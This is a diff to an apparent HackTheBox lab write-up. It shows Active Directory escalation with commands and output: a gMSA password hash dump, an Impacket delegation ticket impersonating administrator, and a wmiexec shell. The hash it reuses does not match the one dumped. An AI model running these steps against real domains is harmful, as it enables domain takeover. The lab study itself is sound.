@@ -423,10 +423,77 @@ Used bloodhound to enumerate the domain:
 bloodhound-python -ns 10.10.10.248 -d intelligence.htb -dc dc.intelligence.htb -u 'Ted.Graves' -p 'Mr.Teddy' -c All
 ```
 
+Marked the users `Ted.Graves@intelligence.htb` and `Tiffany.Molina@intelligence.htb` as owned, then looked for the shortest path from owned principals.
+
 ![Bloodhound](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Intelligence/Images/Bloodhound.png)
 
+`Ted.Graves` is in the `ITSupport` group, which has **ReadGMSAPassword** on `SVC_INT`. Even more interestingly, the `svc_int` account has **AllowedToDelegate** on the DC. 
 
+## Privilege Escalation - ReadGMSAPassword
 
+Group Manage Service Accounts (GMSA) provide additional security to service accounts. There’s a Python tool for extracting GMSA passwords, `gMSADumper.py`.
+
+To use the script, added entry to etc `hosts` file for `intelligence.htb` and used command below:
+
+```bash
+sudo python gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -l intelligence.htb -d intelligence.htb
+
+Users or groups who can read password for svc_int$:
+ > DC$
+ > itsupport
+svc_int$:::51e4932f13712047027300f869d07ab6
+svc_int$:aes256-cts-hmac-sha1-96:285962204a4f54a092182cc51512bda5137de5b33becfd27797d079ba440e6d5
+svc_int$:aes128-cts-hmac-sha1-96:cc50179e1ce82827a22ef0ad4fab3bd9
+```
+
+[This post from OnSecurity](https://www.onsecurity.io/blog/abusing-kerberos-from-linux/) gives the steps to request a forged ticket from the delegated service. I’ll use getST.py from Impacket to craft a silver ticket. I need to pass it the following options:
+
+* `-dc-ip 10.10.10.248`
+* `-spn www/dc.intelligence.htb` - the SPN (see below)
+* `-hashes :5e47bac787e5e1970cf9acdb5b316239` - the NTLM I collected earlier
+* `-impersonate administrator` - the user I want a ticket for
+* `intelligence.htb/svc_int` - the account I’m running
+
+To get the SPN, that’s in the `Node Info -> Node Properties` section for the `svc_int` user in Bloodhound.
+
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/getST.py -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate administrator intelligence.htb/svc_int
+
+[sudo] password for kali: 
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
+```
+
+Error that the clock skew is off is thrown. The `ntpdate` command will update the time based on an NTP server:
+
+```bash
+sudo ntpdate 10.10.10.248   
+2024-06-29 21:44:10.626637 (+0000) +25201.580938 +/- 0.022732 10.10.10.248 s1 no-leap
+CLOCK: time stepped by 25201.580938
+```
+
+Now we can geenrate a ticket:
+
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/getST.py -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate administrator intelligence.htb/svc_int
+
+[sudo] password for kali: 
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in administrator.ccache
+```
+
+To get a shell, I’ll use `wmiexec` (which comes with Impacket). -k will specify Kerberos authentication. I’ll set the KRB5CCNAME environment variable to point to the ticket file I want to use.
+
+```bash
+KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb
+```
 
 
 
